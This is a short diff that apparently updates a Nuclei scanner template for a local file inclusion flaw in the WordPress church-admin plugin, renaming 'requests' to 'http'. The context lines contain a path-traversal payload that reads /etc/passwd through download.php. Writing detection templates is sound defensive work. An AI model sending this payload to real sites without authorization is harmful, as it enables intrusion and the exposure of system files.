@@ -7,7 +7,7 @@ info:
   tags: wordpress,wp-plugin,lfi
   reference: https://wpscan.com/vulnerability/8997
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/church-admin/display/download.php?key=../../../../../../../etc/passwd'
